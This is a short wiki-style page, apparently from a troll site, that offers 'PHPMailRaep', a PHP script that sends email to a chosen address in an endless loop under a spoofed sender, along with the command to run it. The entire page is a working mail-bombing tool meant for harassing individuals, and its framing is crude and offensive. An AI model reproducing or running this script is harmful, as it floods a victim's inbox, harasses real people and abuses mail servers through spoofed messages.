PHPMailRaep is a simple script to spam [SMSRape](/SMSRape) and email addresses.

## Code  ##

<pre><?php
// Simple PHPMailRaep by janus zeal
// irc.netchan.org #insurgency
$to = "email address";
$subject = "asshole of the year";
$message = "haha";
$from = "pedrobear@internet.br";
// From address doesn't have to be valid, but it should look like a real email
// Don't edit below here
$count = 0;
$headers = "From: $from";
while (1) {
        $count++;
        mail($to,$subject,$message,$headers);
        print "Message sent, Now @ " . $count . "\n";
}
?></pre>


## Use  ##

Run from the nix command line, sendmail and php-cgi are required. 
<pre>php-cgi mail.php</pre>

Ctrl-c to exit (Not pretty, I know. :\)
